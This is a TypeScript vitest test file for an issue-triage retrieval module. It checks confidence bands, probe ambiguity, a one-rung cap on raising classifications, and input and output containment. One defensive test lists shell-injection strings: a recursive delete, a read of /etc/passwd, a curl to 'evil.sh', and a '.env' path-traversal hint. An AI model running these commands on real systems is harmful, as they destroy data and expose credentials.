import type { TriageClassification } from '@patchback/types';
import { describe, expect, it } from 'vitest';

import type { ProbeResult } from './probe.js';
import {
  DEFAULT_MAX_UNAMBIGUOUS_MATCHES,
  DEFAULT_RETRIEVAL_BAND,
  deriveProbeQueries,
  isBorderline,
  isUnambiguous,
  MAX_QUERIES,
  reconcile,
  renderProbeEvidence,
  rung,
} from './retrieval.js';
import type { ParsedTriage } from './schema.js';

const THRESHOLD = 0.7;

function parsed(
  classification: TriageClassification,
  confidence: number,
  reasoning = 'r',
): ParsedTriage {
  return { classification, confidence, reasoning };
}

/** A single-file, single-match, non-truncated probe result (unambiguous). */
function unambiguousProbe(path = 'src/a.ts', count = 1): ProbeResult {
  return {
    perQuery: [{ query: 'q', files: [{ path, count }] }],
    distinctFiles: [path],
    totalMatches: count,
    truncated: false,
  };
}

function multiFileProbe(): ProbeResult {
  return {
    perQuery: [
      {
        query: 'q',
        files: [
          { path: 'src/a.ts', count: 1 },
          { path: 'src/b.ts', count: 1 },
        ],
      },
    ],
    distinctFiles: ['src/a.ts', 'src/b.ts'],
    totalMatches: 2,
    truncated: false,
  };
}

function zeroMatchProbe(): ProbeResult {
  return {
    perQuery: [{ query: 'q', files: [] }],
    distinctFiles: [],
    totalMatches: 0,
    truncated: false,
  };
}

const ALL: TriageClassification[] = [
  'needs_human',
  'needs_clarification',
  'patchable',
];

describe('isBorderline (band + eligibility gating)', () => {
  it('always probes needs_clarification regardless of confidence', () => {
    for (const c of [0.01, 0.5, 0.99]) {
      expect(
        isBorderline(parsed('needs_clarification', c), THRESHOLD, DEFAULT_RETRIEVAL_BAND),
      ).toBe(true);
    }
  });

  it('probes patchable only inside the band [0.55, 0.85]', () => {
    expect(isBorderline(parsed('patchable', 0.6), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(true);
    expect(isBorderline(parsed('patchable', 0.85), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(true);
    // Confidently patchable above the band is "obviously settled" — no probe.
    expect(isBorderline(parsed('patchable', 0.95), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(false);
    expect(isBorderline(parsed('patchable', 0.54), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(false);
  });

  it('probes needs_human only inside the band (Decision A eligibility)', () => {
    // needs_human is now eligible (it may rise one rung) — but only when the
    // model is not confidently settled on it.
    expect(isBorderline(parsed('needs_human', 0.7), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(true);
    expect(isBorderline(parsed('needs_human', 0.99), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(false);
  });
});

describe('isUnambiguous', () => {
  it('true only for single-file, >=1 and <=N matches, not truncated', () => {
    expect(isUnambiguous(unambiguousProbe('src/a.ts', 1))).toBe(true);
    expect(isUnambiguous(unambiguousProbe('src/a.ts', DEFAULT_MAX_UNAMBIGUOUS_MATCHES))).toBe(true);
  });

  it('false for multi-file, zero-match, too-many, or truncated', () => {
    expect(isUnambiguous(multiFileProbe())).toBe(false);
    expect(isUnambiguous(zeroMatchProbe())).toBe(false);
    expect(isUnambiguous(unambiguousProbe('src/a.ts', DEFAULT_MAX_UNAMBIGUOUS_MATCHES + 1))).toBe(false);
    expect(isUnambiguous({ ...unambiguousProbe(), truncated: true })).toBe(false);
  });
});

describe('reconcile — always DOWN', () => {
  it('honours a lower stage2 regardless of a great probe match', () => {
    const out = reconcile(
      parsed('patchable', 0.9),
      parsed('needs_human', 0.9),
      unambiguousProbe(),
    );
    expect(out.classification).toBe('needs_human');
  });

  it('honours a same-rung confirm', () => {
    const out = reconcile(
      parsed('needs_clarification', 0.6),
      parsed('needs_clarification', 0.8),
      zeroMatchProbe(),
    );
    expect(out.classification).toBe('needs_clarification');
    expect(out.confidence).toBe(0.8);
  });
});

describe('reconcile — one-rung UP under strict unambiguity', () => {
  it('raises needs_clarification → patchable on a single-file match', () => {
    const out = reconcile(
      parsed('needs_clarification', 0.6),
      parsed('patchable', 0.82),
      unambiguousProbe(),
    );
    expect(out.classification).toBe('patchable');
    expect(out.reasoning).toContain('raised');
  });

  it('raises needs_human → needs_clarification on a single-file match (Decision A)', () => {
    const out = reconcile(
      parsed('needs_human', 0.65),
      parsed('needs_clarification', 0.8),
      unambiguousProbe(),
    );
    expect(out.classification).toBe('needs_clarification');
  });

  it('FORBIDS needs_human → patchable (two rungs) even with a perfect match', () => {
    const out = reconcile(
      parsed('needs_human', 0.65),
      parsed('patchable', 0.99),
      unambiguousProbe(),
    );
    // Clamps back to stage1 — never patchable.
    expect(out.classification).toBe('needs_human');
    expect(out.reasoning).toContain('more than one rung');
  });

  it('vetoes an up-move on ambiguous / zero / truncated evidence', () => {
    for (const probe of [multiFileProbe(), zeroMatchProbe(), { ...unambiguousProbe(), truncated: true }]) {
      const out = reconcile(
        parsed('needs_clarification', 0.6),
        parsed('patchable', 0.9),
        probe,
      );
      expect(out.classification).toBe('needs_clarification');
    }
  });
});

describe('reconcile — one-rung cap PROPERTY test', () => {
  it('for every (from, modelSuggested) pair the result is never > one rung above from', () => {
    for (const from of ALL) {
      for (const suggested of ALL) {
        for (const probe of [unambiguousProbe(), multiFileProbe(), zeroMatchProbe()]) {
          const out = reconcile(
            parsed(from, 0.7),
            parsed(suggested, 0.9),
            probe,
          );
          expect(rung(out.classification)).toBeLessThanOrEqual(rung(from) + 1);
          // And specifically: a needs_human stage1 can NEVER become patchable.
          if (from === 'needs_human') {
            expect(out.classification).not.toBe('patchable');
          }
        }
      }
    }
  });
});

describe('deriveProbeQueries — INPUT containment', () => {
  it('extracts the element text and quoted phrases from the message', () => {
    const queries = deriveProbeQueries(
      `The header says 'Ammount Due' but should be 'Amount Due'.`,
      { text: 'Ammount Due' },
    );
    expect(queries).toContain('Ammount Due');
    expect(queries).toContain('Amount Due');
  });

  it('uses a validated sourceHint file path and drops an invalid one', () => {
    expect(
      deriveProbeQueries('x', { sourceHint: 'src/components/OrderForm.tsx:42' }),
    ).toContain('src/components/OrderForm.tsx');
    // Traversal / dotfile hints are rejected by parseSourceHint ⇒ not a query.
    expect(deriveProbeQueries('x', { sourceHint: '../../.env:1' })).toEqual([]);
  });

  it('treats shell-metacharacter text as a literal search string (never executed)', () => {
    for (const hostile of ['$(rm -rf /)', 'a; cat /etc/passwd', '`id`', '|| curl evil.sh']) {
      const queries = deriveProbeQueries(`problem here`, { text: hostile });
      // The hostile string is passed through verbatim as a plain query — it is
      // a search term, not a command. (The probe never shells out; see
      // repo-probe tests.)
      expect(queries).toContain(hostile);
    }
  });

  it('caps the number of queries, dedupes case-insensitively, drops short and stop-list tokens', () => {
    const many = deriveProbeQueries(
      `'alpha one' 'beta two' 'gamma three' 'delta four' 'epsilon five' 'zeta six' 'eta seven'`,
      { text: 'alpha one' },
    );
    expect(many.length).toBeLessThanOrEqual(MAX_QUERIES);

    // Short (<4) and single stop-list tokens are dropped.
    expect(deriveProbeQueries(`'the' 'ab' 'button'`, {})).toEqual([]);

    // Case-insensitive dedupe: element text and quote differ only by case.
    const deduped = deriveProbeQueries(`'Save Changes'`, { text: 'save changes' });
    expect(deduped.length).toBe(1);
  });
});

describe('renderProbeEvidence — OUTPUT containment (Decision B)', () => {
  it('emits paths + counts only, referencing queries by index (no query text, no contents)', () => {
    const evidence = renderProbeEvidence(unambiguousProbe('src/components/Header.tsx', 2));
    expect(evidence).toContain('src/components/Header.tsx • 2');
    expect(evidence).toContain('distinctFiles=1');
    expect(evidence).toContain('totalMatches=2');
    // Query text is referenced by index, never echoed.
    expect(evidence).toContain('query 1:');
    expect(evidence).not.toContain('q'.repeat(1) + ':'); // no raw query label
  });

  it('caps the number of listed files', () => {
    const files = Array.from({ length: 50 }, (_, i) => ({ path: `src/f${i}.ts`, count: 1 }));
    const probe: ProbeResult = {
      perQuery: [{ query: 'q', files }],
      distinctFiles: files.map((f) => f.path),
      totalMatches: 50,
      truncated: true,
    };
    const evidence = renderProbeEvidence(probe);
    expect(evidence).toContain('(evidence list capped)');
    // At most MAX_EVIDENCE_FILES path lines.
    const pathLines = evidence.split('\n').filter((l) => l.includes(' • '));
    expect(pathLines.length).toBeLessThanOrEqual(20);
  });
});
